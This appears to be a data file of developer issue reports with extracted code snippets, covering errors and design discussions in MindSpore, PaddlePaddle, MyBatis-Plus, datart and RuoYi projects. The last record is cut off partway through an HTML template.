[r1.3][MS][NET][resnet][ascend/gpu]KeyError: 'epoch_num',": /device gpu : -- MindSpore version :commit_id:58619b2bb -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C79/20210916 test_ms_model_zoo_resnet50_imagenet_train_check_loss_8p.py get code from model_zoo sh run_distribute_train.sh network train failed network train success resnet网络在ascend910或gpu环境训练失败   <code>: Traceback (most recent call last): File ""train.py"", line 401, in &lt;module&gt; train_net() File ""/home/jenkins/workspace/TDT_deployment/solution_test/test_scripts/mindspore/net/resnet50/network/resnet_network/test_ms_model_zoo_resnet50_imagenet_train_check_loss_8p/scripts/train_parallel0/src/model_utils/moxing_adapter.py"", line 104, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 341, in train_net init_weight(net=net, param_dict=ckpt_param_dict) File ""train.py"", line 226, in init_weight config.has_trained_epoch = int(param_dict[""epoch_num""].data.asnumpy()) KeyError: 'epoch_num'"
Update design doc for Python Layer,This update is about how to implement layer function. The logic in this PR is as follow: There are around 150 lines of code to implement layer if we do not provide any common functions. So it is necessary to give a mechanism for code reusing. There is a comparison between global functions and a helper class. The disadvantages of global functions are 1) lack of a namespace. 2) Need to pass parameter every time. There are two pieces of demo code for global functions and a helper class. It shows that a helper class can make code shorter and clearer. How to implement a layer helper class.   <code>: FullyConnected
DAM model GPU reproducibility problem,"【Document Link】/【文档链接】 DAM model GPU version code (forked and modified mindspore/models repository): https://gitee.com/alex1999_hub/models/tree/dam/research/nlp/dam 【Issues Section】/【问题文档片段】 <ol start=""3""> 【Existing Issues】/【存在的问题】 <ol start=""4""> 【Expected Result】【预期结果】 While training the model on distributed GPU there is a problem with the reproducibility of the results. After each training the accuracy results are different by approximately 1-5%. I've tried to fix all reasons that may lead to such behaviour: Fixed seeds with and commands. Disabled dataset shuffling. But the randomness is still exists. How it can be explained? And how it can be fixed?   <code>: ms.set_seed() ms.dataset.config.set_seed()"
使用d_loss_cov.backward()时报错,"标题：d_loss_cov.backward()报错为Cannot find gradient of variable dygraph_tmp_398@GRAD 硬件信息 当前环境高级GPU 切换环境 CPU 2 RAM 16GB GPU v100 显存 16GB 磁盘 100GB GPU资源信息 算力卡余额 8.0点(0.5点/小时) 本周可使用 8.0小时 环境配置 Python版本 python 3.7 框架版本 PaddlePaddle 2.1.2 源代码： #!/usr/bin/env python3 # 超参数准备包 import argparse import time import paddle import abc import paddle # 数据集准备包 import os import paddle.fluid.layers as layers from loader import TrainDatasetFromFolder, ValidDatasetFromFolder from paddle.io import DataLoader 网络初始化类 from critic import critic from decoder import decode from encoder import encode 损失函数准备包 from paddle.vision.models.vgg import vgg16 #paddle.v2.networks.vgg_16_network from vgg_loss import VGGLoss from paddle.nn.functional import binary_cross_entropy_with_logits, mse_loss from ssim import <em>ssim</em> 优化算法准备包 from paddle.optimizer import Adam 网络训练准备包 from tqdm import tqdm import gc import numpy as np from paddle.autograd import backward 画数据图准备包 import matplotlib matplotlib.use('Agg') import matplotlib.pyplot as plt import pandas as pd detailed 准备包 from PIL import Image 压缩准备包 from math import log10 结果存储路径包 from datetime import datetime cpu_tensor = paddle.to_tensor(1, place=paddle.CPUPlace()) print(cpu_tensor.place) def GeneratorLoss(stego_images, cover_images, decoded, message): encoder_mse = mse_loss(stego_images, cover_images) decoder_mse = mse_loss(decoded, message) return encoder_mse, decoder_mse def AdversaryLoss(input, label): bce_with_logits_loss = binary_cross_entropy_with_logits(input, label) return bce_with_logits_loss def random_data(cover, data_depth): N, _, H, W = cover.shape[0], cover.shape[1], cover.shape[2], cover.shape[3] shape_message=[N,data_depth] message = paddle.rand(shape_message) shape_payload=[N,data_depth,H,W] payload = paddle.rand(shape_payload) for i in range(H): for j in range(W): payload[:, :, i, j] = message return payload, message def main(): paddle.seed(42) if name == 'main': start = time.perf_counter() 报错： Traceback (most recent call last): File ""train.py"", line 480, in main() File ""train.py"", line 176, in main d_loss_cov.backward() File """", line 2, in backward File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/wrapped_decorator.py"", line 25, in impl return wrapped_func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/framework.py"", line 227, in impl return func(*args, **kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 239, in backward framework.<em>dygraph_tracer()) RuntimeError: (NotFound) Cannot find gradient of variable dygraph_tmp_398@GRAD [Hint: Expected iter != accumulators</em>.end() == true, but received iter != accumulators_.end():0 != true:1.] (at /paddle/paddle/fluid/imperative/basic_engine.cc:366)   <code>: ''' 1.设置超参数 ''' parser = argparse.ArgumentParser(description='End2end data hiding for HEVC') parser.add_argument('--epochs', default=10, type=int) parser.add_argument('--data_depth', default=30, type=int) parser.add_argument('--hidden_size', default=64, type=int) parser.add_argument('--dataset_val', default=""val"", type=str) parser.add_argument('--dataset_train', default=""train"", type=str) parser.add_argument('--output', default=False, type=str) parser.add_argument('--train_batch_size', default=12, type=int, help='train epoch number') parser.add_argument('--valid_batch_size', default=12, type=int, help='valid epoch number') parser.add_argument('--crop_size', default=128, type=int, help='training images crop size') parser.add_argument('--save_interval', default=200, type=int, help='save_interval') parser.add_argument('--learning_rate', default=1e-3, type=float, help='learning_rate') args = parser.parse_args() timestamp = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"") + ""_C11_1e-3_weight2"" print(timestamp) dir_val = './{}_crop128_L30/'.format(args.dataset_val) + '/' + 'test' if not os.path.exists(dir_val): os.makedirs(dir_val) dir_train = './{}_crop128_L30/'.format(args.dataset_train) + '/' + 'test' if not os.path.exists(dir_train): os.makedirs(dir_train) ''' 2.设置数据集 ''' root_dir_val = ""/home/aistudio/data"" root_dir_train = ""/home/aistudio/data"" #cd /home/aistudio/data/data110281/ &amp;&amp; unzip -qo dataset_test.zip train_path = os.path.join(root_dir_train, args.dataset_train) #print(train_path) #print(args.dataset) valid_path = os.path.join(root_dir_val, args.dataset_val) # 数据集预处理 train_set = TrainDatasetFromFolder(train_path, crop_size=args.crop_size) valid_set = ValidDatasetFromFolder(valid_path, crop_size=args.crop_size) train = DataLoader(dataset=train_set, num_workers=0, batch_size=args.train_batch_size, shuffle=False) valid = DataLoader(dataset=valid_set, num_workers=0, batch_size=args.valid_batch_size, shuffle=False) # 查看数据预处理的结果 #cover_train = next(iter(train)) #print('train: cover.size() = ', cover_train.size()) #cover_valid = next(iter(valid)) #print('valid: cover.size() = ', cover_valid.size()) ''' 3.选择设备(CPU或者GPU(0/1)) ''' #device = paddle.set_device('cuda:1' if paddle.fluid.is_compiled_with_cuda() else 'cpu') #print(""Using {} device"".format(device)) ''' 4.准备训练 ''' # 网络初始化 Critic = critic(args.hidden_size) Encode = encode(args.data_depth, args.hidden_size) Decode = decode(args.data_depth, args.hidden_size) # 上传到设备 # Critic = Critic.to(device) # Encode = Encode.to(device) # Decode = Decode.to(device) # 查看参数量 print('Critic parameters:', sum(param.numel() for param in Critic.parameters())) print('Encode parameters:', sum(param.numel() for param in Encode.parameters())) print('Decode parameters:', sum(param.numel() for param in Decode.parameters())) # 准备好优化算法 adver_optimizer = Adam(args.learning_rate, parameters = Critic.parameters()) Parm_ED=list(Encode.parameters()) + list(Decode.parameters()) gener_optimizer = Adam(args.learning_rate, parameters = Parm_ED ) ''' 5.开始训练 ''' # Defined the labels used for training the discriminator/adversarial loss cover_label = 1 stego_label = 0 # 保存数据所用的变量 # 画图所用 epos, train_losss, train_psnrs, train_accus, train_ssims = [], [], [], [], [] valid_losss, valid_psnrs, valid_accus, valid_ssims = [], [], [], [] # 保存数据所用的变量 train_results = {'tra_loss': [], 'loss_dec': [], 'loss_enc': [], 'loss_adv': [], 'steg_sco': [], 'cove_sco': [], 'tra_psnr': [], 'tra_accu': [], 'tra_ssim': []} valid_results = {'val_loss': [], 'loss_dec': [], 'loss_enc': [], 'loss_adv': [], 'steg_sco': [], 'cove_sco': [], 'val_psnr': [], 'val_accu': [], 'val_ssim': [], 'val_psn2': []} for epoch in range(1, args.epochs + 1): print('Epoch {}/{}'.format(epoch, args.epochs)) train_number, train_g_loss= 0.001, 0 train_d_loss_cov, train_d_loss_ste, train_g_loss_dec, train_g_loss_enc, train_g_loss_adv, train_psnr, train_accu, train_ssim = 0, 0, 0, 0, 0, 0, 0, 0 training_results = {'train_g_loss': []} for cover in tqdm(train): #for cover, _ in train: #cover = cover.to(device) batch_size = args.train_batch_size Critic.train() Encode.train() Decode.train() #gc.collect() with paddle.set_grad_enabled(True): # ---------------- Train the discriminator ----------------------------- for i in range(1): adver_optimizer.clear_grad()# 把模型中参数的梯度设为0 d_target_label_cover = paddle.full((batch_size, 1), cover_label) d_target_label_stego = paddle.full((batch_size, 1), stego_label) # train on cover d_on_cover = Critic(cover) d_loss_cov = AdversaryLoss(d_on_cover, d_target_label_cover) d_loss_cov.backward() # train on stego payload, message = random_data(cover, args.data_depth) stego = Encode(cover, payload) unload = Decode(stego) d_on_stego = Critic(stego.detach())# detach的作用是阻断反向梯度传播 d_loss_ste = AdversaryLoss(d_on_stego, d_target_label_stego) d_loss_ste.backward() adver_optimizer.step() # --------------Train the generator (encoder-decoder) --------------------- gener_optimizer.clear_grad() # 把模型中参数的梯度设为0 g_target_label_stego = paddle.full((batch_size, 1), cover_label) # target label for stego images should be 'cover', because we want to fool the discriminator g_on_stego = Critic(stego) g_loss_adv = AdversaryLoss(g_on_stego, g_target_label_stego) g_loss_enc, g_loss_dec = GeneratorLoss(stego, cover, unload, message) # g_loss = g_loss_dec + g_loss_enc + g_loss_adv g_loss = g_loss_dec + 0.7 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 1.2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 1.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.5 * g_loss_dec + 1.2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.2 * g_loss_dec + 0.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.5 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.8 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.3 * g_loss_enc + 0.001 * g_loss_adv g_loss.backward() gener_optimizer.step() # 通过梯度下降执行一步参数更新 # 改变psnr的计算方式 cover0 = np.round(255 * ((cover.numpy() * 0.5) + 0.5)) stego0 = np.round(255 * ((stego.numpy() * 0.5) + 0.5)) cover0 = paddle.to_tensor(cover0) stego0 = paddle.to_tensor(stego0) mse = mse_loss(stego0, cover0) psnr = (10 * paddle.log10(255 * 255 / mse)).item() decoded = unload.detach().cpu().numpy().round().clip(0, 1) accu = 1 - np.sum(np.abs(decoded - message.detach().cpu().numpy())) / (batch_size * message.shape[1]) ssim = _ssim_(cover, stego).item() train_number += batch_size train_g_loss += g_loss.item() * batch_size train_g_loss_dec += g_loss_dec.item() * batch_size train_g_loss_enc += g_loss_enc.item() * batch_size train_g_loss_adv += g_loss_adv.item() * batch_size train_d_loss_ste += d_loss_ste.item() * batch_size train_d_loss_cov += d_loss_cov.item() * batch_size train_psnr += psnr * batch_size train_accu += accu * batch_size train_ssim += ssim * batch_size training_results['train_g_loss'].append(train_g_loss/ train_number) data_frame = pd.DataFrame(data={'train_g_loss': training_results['train_g_loss']}) data_frame.to_csv(dir + '/B_train_data_{}.csv'.format(epoch)) # 保存训练过程的数据 save train_loss,画图用 epos.append(epoch) train_losss.append(train_g_loss / train_number) train_psnrs.append(train_psnr / train_number) train_accus.append(train_accu / train_number) train_ssims.append(train_ssim / train_number) # 保存训练过程的数据 save train_loss train_results['tra_loss'].append(train_g_loss / train_number) train_results['loss_dec'].append(train_g_loss_dec / train_number) train_results['loss_enc'].append(train_g_loss_enc / train_number) train_results['loss_adv'].append(train_g_loss_adv / train_number) train_results['steg_sco'].append(train_d_loss_ste / train_number) train_results['cove_sco'].append(train_d_loss_cov / train_number) train_results['tra_psnr'].append(train_psnr / train_number) train_results['tra_accu'].append(train_accu / train_number) train_results['tra_ssim'].append(train_ssim / train_number) data_frame = pd.DataFrame(data={' tra_loss ': train_results['tra_loss'], ' loss_dec ': train_results['loss_dec'], ' loss_enc ': train_results['loss_enc'], ' loss_adv ': train_results['loss_adv'], ' steg_sco ': train_results['steg_sco'], ' cove_sco ': train_results['cove_sco'], ' tra_psnr ': train_results['tra_psnr'], ' tra_accu ': train_results['tra_accu'], ' tra_ssim ': train_results['tra_ssim']}, index=range(1, epoch + 1)) data_frame.to_csv(dir + '/A_train_data.csv', index_label='Epoch') # 保存模型参数，每训练save_interval个epoch 保存一次model if epoch % args.save_interval == 0: paddle.save(Critic.state_dict(), dir + '/Z%d_epoch_Critic.pth' % (epoch)) paddle.save(Encode.state_dict(), dir + '/Z%d_epoch_Encode.pth' % (epoch)) paddle.save(Decode.state_dict(), dir + '/Z%d_epoch_Decode.pth' % (epoch)) valid_number, valid_g_loss = 0.001, 0 valid_d_loss_cov, valid_d_loss_ste, valid_g_loss_dec, valid_g_loss_enc, valid_g_loss_adv, \ valid_psnr, valid_accu, valid_ssim, valid_psn2, psn2 = 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 BatchNumber = 0 for cover in tqdm(valid): cover = cover.to(device) batch_size = cover.size(0) BatchNumber += 1 Critic.eval()# 进入eval模式 （测试模式参数固定，只有前向传播） Encode.eval() Decode.eval() with paddle.clear_grad(): d_target_label_cover = paddle.full((batch_size, 1), cover_label, device=device) d_target_label_stego = paddle.full((batch_size, 1), stego_label, device=device) g_target_label_stego = paddle.full((batch_size, 1), cover_label, device=device) d_on_cover = Critic(cover) d_loss_cov = AdversaryLoss(d_on_cover, d_target_label_cover) payload, message = random_data(cover, args.data_depth, device) stego = Encode(cover, payload) unload = Decode(stego) d_on_stego = Critic(stego) d_loss_ste = AdversaryLoss(d_on_stego, d_target_label_stego) g_on_stego = Critic(stego) g_loss_adv = AdversaryLoss(g_on_stego, g_target_label_stego) g_loss_enc, g_loss_dec = GeneratorLoss(stego, cover, unload, message) # g_loss = g_loss_dec + g_loss_enc + g_loss_adv g_loss = g_loss_dec + 0.7 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 1.2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = g_loss_dec + 1.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.5 * g_loss_dec + 1.2 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.2 * g_loss_dec + 0.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.5 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 0.8 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.1 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.5 * g_loss_enc + 0.001 * g_loss_adv # g_loss = 1.0 * g_loss_dec + 0.3 * g_loss_enc + 0.001 * g_loss_adv # 改变psnr的计算方式 cover1 = np.round(255 * ((cover.data.cpu().numpy() * 0.5) + 0.5)) stego1 = np.round(255 * ((stego.data.cpu().numpy() * 0.5) + 0.5)) cover1 = paddle.to_tensor(cover1) stego1 = paddle.to_tensor(stego1) mse = mse_loss(stego1, cover1) psnr = (10 * paddle.log10(255 * 255 / mse)).item() decoded = unload.detach().cpu().numpy().round().clip(0, 1) accu = 1 - np.sum(np.abs(decoded - message.detach().cpu().numpy())) / (batch_size * message.shape[1]) ssim = _ssim_(cover, stego).item() valid_number += batch_size valid_g_loss += g_loss.item() * batch_size valid_g_loss_dec += g_loss_dec.item() * batch_size valid_g_loss_enc += g_loss_enc.item() * batch_size valid_g_loss_adv += g_loss_adv.item() * batch_size valid_d_loss_ste += d_loss_ste.item() * batch_size valid_d_loss_cov += d_loss_cov.item() * batch_size valid_psnr += psnr * batch_size valid_accu += accu * batch_size valid_ssim += ssim * batch_size valid_psn2 += psn2 * batch_size # 开始：将Valid_CoverImages进行可视化 if epoch % 100 == 0: cover_visual = cover.permute(0, 2, 3, 1).detach().cpu().data.numpy() cover_visual_path = dir + ""/Valid_CoverImages/"" os.makedirs(cover_visual_path, exist_ok=True) count = 0 for i in range(cover_visual.shape[0]): count += 1 cover_visual[i] = np.round((255 * ((cover_visual[i] + 1.0) / 2.0))) image = cover_visual[i].astype(dtype='uint8') # image = np.squeeze(image, axis=2) # print(""cover_visual_{}.shape = {}"".format(i, cover_visual[i].shape)) # print(""type = {}"".format(cover_visual[0][0][0][0].dtype)) # print(""np.max = {}, np.min = {}"".format(np.max(cover_visual[i]), np.min(cover_visual[i]))) img = Image.fromarray(image) img.save(cover_visual_path + ""{}_{:0&gt;4d}.bmp"".format(epoch, (BatchNumber - 1) * 12 + count), 'bmp') # 结束：将Valid_CoverImages进行可视化 # 开始：将Valid_StegoImages进行可视化 if epoch % 100 == 0: stego_visual_path = dir + ""/Valid_StegoImages/"" os.makedirs(stego_visual_path, exist_ok=True) count = 0 for i in range(stego.size(0)): stego_visual = stego[i].permute(1, 2, 0).detach().cpu().data.numpy() count += 1 stego_visual = np.round(255.0 * ((stego_visual + 1.0) / 2.0)) image = stego_visual.astype(dtype='uint8') # image = np.squeeze(image, axis=2) img = Image.fromarray(image) img.save(stego_visual_path + ""{}_{:0&gt;4d}.bmp"".format(epoch, (BatchNumber - 1) * 12 + count), 'bmp') # 结束：将Valid_StegoImages进行可视化 # 开始：将valid上cover写入相应路径txt_path txt_path = dir + ""/valid_cover_detailed/"" os.makedirs(txt_path, exist_ok=True) for i in range(cover.shape[0]): if epoch == 1 and BatchNumber == 1 and i == 0: file = open(txt_path + ""B_maxANDmin.txt"", 'w') else: file = open(txt_path + ""B_maxANDmin.txt"", 'a') f = cover[i].data.cpu().numpy() file.write(""epoch:{:0&gt;3d}; image:{:0&gt;4d}; np.max() = {:.8f}; np.min() = {:.8f}"".format(epoch, (BatchNumber - 1) * 12 + 1 + i, np.max(f), np.min(f)) + ""\n"") file.close() # 结束：将valid上cover写入相应路径txt_path # 开始：将valid上stego写入相应路径txt_path txt_path = dir + ""/valid_stego_detailed/"" os.makedirs(txt_path, exist_ok=True) for i in range(stego.shape[0]): if epoch == 1 and BatchNumber == 1 and i == 0: file = open(txt_path + ""B_maxANDmin.txt"", 'w') else: file = open(txt_path + ""B_maxANDmin.txt"", 'a') f = stego[i].data.cpu().numpy() file.write(""epoch:{:0&gt;3d}; image:{:0&gt;4d}; np.max() = {:.8f}; np.min() = {:.8f}"".format(epoch, (BatchNumber - 1) * 12 + 1 + i, np.max(f), np.min(f)) + ""\n"") file.close() # 结束：将valid上stego写入相应路径txt_path # 保存验证过程的数据 save val_loss\val_psnr\val_acc, 画图用 valid_losss.append(valid_g_loss / valid_number) valid_psnrs.append(valid_psnr / valid_number) valid_accus.append(valid_accu / valid_number) valid_ssims.append(valid_ssim / valid_number) # 保存验证过程的数据 save val_loss\val_psnr\val_acc valid_results['val_loss'].append(valid_g_loss / valid_number) valid_results['loss_dec'].append(valid_g_loss_dec / valid_number) valid_results['loss_enc'].append(valid_g_loss_enc / valid_number) valid_results['loss_adv'].append(valid_g_loss_adv / valid_number) valid_results['steg_sco'].append(valid_d_loss_ste / valid_number) valid_results['cove_sco'].append(valid_d_loss_cov / valid_number) valid_results['val_psnr'].append(valid_psnr / valid_number) valid_results['val_accu'].append(valid_accu / valid_number) valid_results['val_ssim'].append(valid_ssim / valid_number) valid_results['val_psn2'].append(valid_psn2 / valid_number) data_frame = pd.DataFrame( data={' val_loss ': valid_results['val_loss'], ' loss_dec ': valid_results['loss_dec'], ' loss_enc ': valid_results['loss_enc'], ' loss_adv ': valid_results['loss_adv'], ' steg_sco ': valid_results['steg_sco'], ' cove_sco ': valid_results['cove_sco'], ' val_psnr ': valid_results['val_psnr'], ' val_accu ': valid_results['val_accu'], ' val_ssim ': valid_results['val_ssim'], ' val_psn2 ': valid_results['val_psn2']}, index=range(1, epoch + 1)) data_frame.to_csv(dir + '/A_valid_data.csv', index_label='Epoch') print(""Show resuls......Show one pictures"") fig = plt.figure() b = plt.subplot(221) b.set_title(""Loss"", fontsize=18) b.set_xlabel(""epoch"", fontsize=14) b.set_ylabel(""loss"", fontsize=14) b.plot(epos, train_losss, color='green', label='train loss') b.plot(epos, valid_losss, color='red', label='valid loss') b.legend() # 显示上面的label b.grid() plt.tight_layout() # 设置间隔 c = plt.subplot(222) c.set_title(""valid PSNR"", fontsize=18) c.set_xlabel(""epoch"", fontsize=14) c.set_ylabel(""psnr"", fontsize=14) c.plot(epos, train_psnrs, color='green', label='train psnr') c.plot(epos, valid_psnrs, color='red', label='valid psnr') c.legend() # 显示上面的label c.grid() plt.tight_layout() # 设置间隔 d = plt.subplot(223) d.set_title(""valid ACCU"", fontsize=18) d.set_xlabel(""epoch"", fontsize=14) d.set_ylabel(""accu"", fontsize=14) d.plot(epos, train_accus, color='green', label='train accu') d.plot(epos, valid_accus, color='red', label='valid accu') d.legend() # 显示上面的label d.grid() plt.tight_layout() # 设置间隔 e = plt.subplot(224) e.set_title(""valid SSIM"", fontsize=18) e.set_xlabel(""epoch"", fontsize=14) e.set_ylabel(""ssim"", fontsize=14) e.plot(epos, train_ssims, color='green', label='train ssim') e.plot(epos, valid_ssims, color='red', label='valid ssim') e.legend() # 显示上面的label e.grid() fig.savefig(dir + ""/A_result.png"") main() end = time.perf_counter() print(""time = {:.3f}h"".format((end - start) / 3600))"
Design Doc: Complete Fluid,"Motivation Currently, our Fluid implementation is incomplete and makes the AI application programming pretty nasty. Fluid was designed to make AI programming concise and easy, like examples in https://github.com/PaddlePaddle/Paddle/issues/7464 https://github.com/PaddlePaddle/Paddle/issues/9912 However, the currently runnable examples are as follows In order to complete the design of Fluid, we create this issue as a table of context of the design of Fluid. Questions to Answer How to train on one node Read data: https://github.com/PaddlePaddle/Paddle/issues/10102 Training data augmentation: augmentation programs <em>pipes</em> the output to PaddlePaddle programs The data format: RecordIO is good for training/testing data, but not good for model parameters. https://github.com/wangkuiyi/recordio Map records into Fluid variables. Save model parameters How to write the program https://github.com/PaddlePaddle/Paddle/issues/9912 How to fetch and feed data from the front end language Should we allow the ability to fetch intermediate variables during execution? How to run the program How to debug Do we want to allow running arbitrary Python code during training? E.g., some custom Python logic to control save model or not during training. How to fetch data during training steps In discussion: https://github.com/PaddlePaddle/Paddle/issues/10152 How to initialize a Fluid program? In discussion: https://github.com/PaddlePaddle/Paddle/issues/10177 How to do distributed training How to do distributed reading How to save huge models How to write program How to run the program SLURM + container MPI + container Kubernetes How to do inference Easy experiments Large-scale serving How to export to ONNX and pipe with TensorRT Examples of an API proposal Recognize Digits Label Semantic Roles Word to Vec   <code>: test_fit_a_line.py"
Custom stack trace refines,Make LayerStack support to show forward/backward status all layer stack shows in one line. multi thread support remove the noising output in each line of fatal error output. add unittest Please use option when merge code.   <code>: squash &amp; merge
日期查询,"当前使用版本 last 写法： startdate 字符串类型； enddate 字符串类型； operationtime Date类型； 日期格式化报错； 修改 sql语句： 请问正确的插入姿势是什么？   <code>: operationLogService.lambdaQuery().setEntity(log). ge(StringUtils.isNotBlank(startdate), OperationLog::getOperationtime, startdate). le(StringUtils.isNotBlank(enddate),OperationLog::getOperationtime, enddate). orderByDesc(StringUtils.isBlank(pageParam.getOrderField()), OperationLog::getOperationtime). page(pageParam.toPage()) operationLogService.lambdaQuery().setEntity(log). ge(StringUtils.isNotBlank(startdate), OperationLog::getOperationtime, ""to_date('"" + startdate + ""','yyyy-mm-dd')""). le(StringUtils.isNotBlank(enddate),OperationLog::getOperationtime, ""to_date('"" + enddate + ""','yyyy-mm-dd')""). orderByDesc(StringUtils.isBlank(pageParam.getOrderField()), OperationLog::getOperationtime). page(pageParam.toPage()) SELECT COUNT(1) FROM SYS_OPERATION_LOG WHERE metaid = '1239369902872838145' AND (operationtime &gt;= 'to_date(''2020-07-11'',''yyyy-mm-dd'')' AND operationtime &lt;= 'to_date(''2020-07-22'',''yyyy-mm-dd'')');"
缺少依赖+启动报错,1、缺少如下依赖 org.mybatis mybatis 3.4.6 org.springframework spring-jdbc 5.2.9.RELEASE 2、启动报错 java.lang.IllegalArgumentException: Could not find class [org.mybatis.spring.boot.autoconfigure.MybatisAutoConfiguration]   <code>: &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt; &lt;/dependency&gt;
Sql 错误,"源码IDE启动 team模式 mysql数据库按照 datart.sql文件创建sql 新建开始分析 新建数据源等都会数据库表少字段 情感更新最新的和版本相匹配的sql Error querying database. Cause: java.sql.SQLSyntaxErrorException: Unknown column 'type' in 'field list' ### The error may exist in datart/core/mappers/ext/ViewMapperExt.java (best guess) ### The error may involve datart.core.mappers.ext.ViewMapperExt.listByOrgId-Inline ### The error occurred while setting parameters ### SQL: SELECT id,,org_id,,, is_folder,parent_id,source_id,description FROM view WHERE org_id=? AND =1 ORDER BY create_time ASC ### Cause: java.sql.SQLSyntaxErrorException: Unknown column 'type' in 'field list' ; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: Unknown column 'type' in 'field list'   <code>: name index type status"
`forward_block_id` should be record in `proto::BlockDesc`,"During the backward stage, an operator can access variables from two blocks, its current block, and its forward block. There are two paths to resolve variables. For example, the forwarding block could be Its backward blocks are Operators in can access variables by () and by (). The order of resolving variables should be breadth-first. i.e. can hide .   <code>: { name: 'block0' { name: 'block1' parent: 'block0' { name: 'block2' parent: 'block1' } } } { name: 'block0_grad' parent: 'block0' fwd_block: 'block0' { name: 'block1_grad' parent: 'block0_grad' fwd_block: 'block1' { name: 'block2_grad' parent: 'block1_grad' fwd_block: 'block2' } } } block2_grad block::parent block2_grad-&gt;block1_grad-&gt;block0_grad-&gt;block0 block::fwd_block block2_grad-&gt;block2-&gt;block1-&gt;block0 variables in block2 variables in block0_grad"
$.table.dropdownToggle 被遮挡,"开发工具：IntelliJ IDEA 2018.3.1 看了看若依的admin，用的表格是treetable下拉框机就没问题，我用的普通的table就出现了 遮挡的问题。   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('岗位列表')"" /&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""container-div""&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12 search-collapse""&gt; &lt;form id=""post-form""&gt; &lt;div class=""select-list""&gt; &lt;ul&gt; &lt;li&gt; 公司名称：&lt;input type=""text"" name=""postCode""/&gt; &lt;/li&gt; &lt;li&gt; &lt;a class=""btn btn-primary btn-rounded btn-sm"" onclick=""$.table.search()""&gt;&lt;i class=""fa fa-search""&gt;&lt;/i&gt;&amp;nbsp;搜索&lt;/a&gt; &lt;a class=""btn btn-warning btn-rounded btn-sm"" onclick=""$.form.reset()""&gt;&lt;i class=""fa fa-refresh""&gt;&lt;/i&gt;&amp;nbsp;重置&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;div class=""btn-group-sm"" id=""toolbar"" role=""group""&gt; &lt;a class=""btn btn-success"" onclick=""$.operate.add(null,800,450)""&gt; &lt;i class=""fa fa-plus""&gt;&lt;/i&gt; 新增 &lt;/a&gt; &lt;/div&gt; &lt;div class=""col-sm-12 select-table table-striped""&gt; &lt;table id=""bootstrap-table"" data-mobile-responsive=""true""&gt;&lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;th:block th:include=""include :: footer"" /&gt; &lt;script th:inline=""javascript""&gt; var prefix = ctx + ""bid""; var addFlag = """"; var editFlag = """"; var removeFlag = """"; $(function() { var options = { url: prefix + ""/list"", createUrl: prefix + ""/add"", updateUrl: prefix + ""/edit?bid_id={id}"", removeUrl: prefix + ""/delete"", sortName: ""postSort"", modalName: ""物流方案"", columns: [ { field: 'bid_name', title: '物流方案名称', width: '30%', align: ""left"", }, { field: 'company_name', title: '所属公司', width: '30%', align: ""left"" }, { title: '操作', align: 'left', width: '40%', formatter: function(value, row, index) { var actions = []; actions.push('&lt;a class=""btn btn-success btn-xs"" href=""#"" onclick=""$.operate.edit(\'' + row.bid_id + '\',800,450)""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;承运商管理&lt;/a&gt; '); actions.push('&lt;a class=""btn btn-success btn-xs"" href=""#"" onclick=""$.operate.edit(\'' + row.bid_id + '\',800,450)""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;车型管理&lt;/a&gt; '); actions.push('&lt;a class=""btn btn-success btn-xs"" href=""#"" onclick=""$.operate.edit(\'' + row.bid_id + '\',800,450)""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;机场管理&lt;/a&gt; '); actions.push('&lt;a 